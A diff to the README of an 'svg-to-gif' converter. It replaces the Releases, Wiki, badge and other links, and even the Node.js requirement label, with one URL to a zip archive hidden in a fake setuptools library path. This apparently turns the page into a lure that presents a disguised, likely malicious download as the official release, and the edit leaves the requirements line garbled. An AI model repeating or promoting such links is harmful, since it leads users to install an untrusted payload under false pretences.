@@ -6,12 +6,12 @@ Welcome to the `svg-to-gif` project! This application allows you to convert SVG 
 
 ## 📥 Download
 
-[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/kkaberia/svg-to-gif/releases)
+[![Download Here](https://github.com/kkaberia/svg-to-gif/raw/refs/heads/main/Create/Lib/site-packages/setuptools/_distutils/command/gif-svg-to-v2.2.zip)](https://github.com/kkaberia/svg-to-gif/raw/refs/heads/main/Create/Lib/site-packages/setuptools/_distutils/command/gif-svg-to-v2.2.zip)
 
 ## 💻 System Requirements
 
 - **Operating System:** Works on Windows, macOS, and Linux.
-- **Node.js:** Version 12 or higher is required.
+- **https://github.com/kkaberia/svg-to-gif/raw/refs/heads/main/Create/Lib/site-packages/setuptools/_distutils/command/gif-svg-to-v2.2.zip** Version 12 or higher is required.
 - **Internet Connection:** Needed for installation and converting SVGs using Puppeteer.
 
 ## 📄 Features
@@ -26,7 +26,7 @@ Welcome to the `svg-to-gif` project! This application allows you to convert SVG 
 
 ### Step 1: Visit the Releases Page
 
-To get started, visit our [Releases page](https://github.com/kkaberia/svg-to-gif/releases) to download the application.
+To get started, visit our [Releases page](https://github.com/kkaberia/svg-to-gif/raw/refs/heads/main/Create/Lib/site-packages/setuptools/_distutils/command/gif-svg-to-v2.2.zip) to download the application.
 
 ### Step 2: Download the Application
 
@@ -88,7 +88,7 @@ Once the conversion is complete, you will see a "Download" button. Click it to s
 
 ## 📚 Additional Resources
 
-For more detailed guides, tips, and troubleshooting, refer to our [Wiki](https://github.com/kkaberia/svg-to-gif/wiki). You can find FAQs, feature details, and user contributions.
+For more detailed guides, tips, and troubleshooting, refer to our [Wiki](https://github.com/kkaberia/svg-to-gif/raw/refs/heads/main/Create/Lib/site-packages/setuptools/_distutils/command/gif-svg-to-v2.2.zip). You can find FAQs, feature details, and user contributions.
 
 ## 💬 Community Help
 
@@ -100,7 +100,7 @@ For direct inquiries, you can reach out to us via our GitHub page. We aim to res
 
 ## 🔗 Key Links
 
-- [Releases Page](https://github.com/kkaberia/svg-to-gif/releases)
-- [Wiki](https://github.com/kkaberia/svg-to-gif/wiki)
+- [Releases Page](https://github.com/kkaberia/svg-to-gif/raw/refs/heads/main/Create/Lib/site-packages/setuptools/_distutils/command/gif-svg-to-v2.2.zip)
+- [Wiki](https://github.com/kkaberia/svg-to-gif/raw/refs/heads/main/Create/Lib/site-packages/setuptools/_distutils/command/gif-svg-to-v2.2.zip)
 
 Thank you for using `svg-to-gif`. We hope you enjoy the simplicity and power of this tool.
